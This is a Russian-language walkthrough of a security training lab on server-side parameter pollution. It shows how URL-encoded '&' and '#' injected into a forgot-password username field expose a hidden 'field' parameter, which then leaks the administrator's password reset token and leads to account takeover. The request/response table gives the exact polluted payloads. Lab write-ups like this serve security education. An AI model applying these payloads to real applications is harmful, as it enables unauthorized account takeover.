Lab: Exploiting server-side parameter pollution in a query string
**Задание: To solve the lab, log in as the administrator and delete carlos. (Чтобы решить лабораторию, войдите как administrator и удалите Carlos).**  
Изначально попадаем на страницу покупки  
<img width="1919" height="946" alt="image" src="https://github.com/user-attachments/assets/90f3ebab-2c0a-40ea-a7b8-d6e7cc2fe600" />  
Кидаем ссылку в burp и максимально исследуем сайт  
<img width="320" height="262" alt="image" src="https://github.com/user-attachments/assets/c5db8d1b-8ccc-4c3e-8812-9c35193efb11" />  
У нас появился запрос forgot-password. Правой кнопкой мыши -> Send To Repeater и теперь видим тело запроса  
1)```csrf=[csrf_token]&username=administrator``` -> получаем ответ, представленный в таблице ниже.  
2)Теперь попробуем изменить имя пользователя на какое-нибудь несуществующее и получаем ответ, представленный в таблице ниже.  
3)Попробуем добавить новый параметр с помощью "&", но закодированным в url ```%26```, получаем ответ, представленный в таблице ниже.  
4)Попробуем использовать # (%23), она обрежет следующие параметры, которые передаются серверу через фронтенд. Например, если фронтенд передает дополнительный параметр ```username=...&notAdmin=true```, то
"#" в ```username=...#``` поможет отрезать дополнительный параметр, если нет, то нам вернется ответ: ```Invalid username```. Пробуем)  
**NOTE: Очень важно закодировать символ # по URL (%23). В противном случае фронтенд-приложение интерпретирует его как идентификатор фрагмента, и он не будет передаваться внутреннему API.**  
5) Исходя из 4 пункта, попробуем добавить новый параметр ```field```
6) Отлично! Мы получили новую ошибку ```Invalid field```, это значит, что мы узнали название параметра, но нам нужно узнать еще и его значение, для этого воспользуемся Intruder в BurpSuite. 
<img width="491" height="38" alt="image" src="https://github.com/user-attachments/assets/887509ef-b4cb-4ded-b35e-ef9bdc470e74" />  
и справа добавляем payload, который можно найти на [github](https://github.com/antichown/burp-payloads/blob/master/Server-side%20variable%20names.pay). Из выводов, мы видем, что ```field=email``` дал нам ответ ```200```.  
7)В файле forgotPasswords.js, найденным на сайте, мы можем увидеть ```/forgot-password?reset_token=${resetToken}```. Можем изменить: ```field=reset_token``` и получаем наш токен)  
Теперь с этим токеном переходим по ```/forgot-password?reset_token=[key]``` и ставим новый пароль, переходим в аккаунт админа -> Admin Panel -> Delete Carlos.  
***Лаба решена!!***
Запросы и ответы можно записать в виде небольшой таблички:  
|Request|Response|
|-------|:------:|
|1) ```csrf=[csrf_token]&username=administrator```|```{"result":"*****@normal-user.net","type":"email"}```|
|2) ```csrf=[csrf_token]&username=administrator1```|```{"type":"ClientError","code":400,"error":"Invalid username."}```|
|3) ```csrf=[csrf_token]&username=administrator%26```|```{"error": "Parameter is not supported."}```|
|4) ```csrf=[csrf_token]&username=administrator%23```|```{"error": "Field not specified."}```|
|5) ```csrf=[csrf_token]&username=administrator%26field=goomi%23```|```{"type":"ClientError","code":400,"error":"Invalid field."}```|
|6) ```csrf=[csrf_token]&username=administrator%26field=email%23```|```{"type":"email","result":"*****@normal-user.net"}```|
|7) ```csrf=[csrf_token]&username=administrator%26field=reset_token%23```|```{"type":"reset_token","result":"[key]"}```|
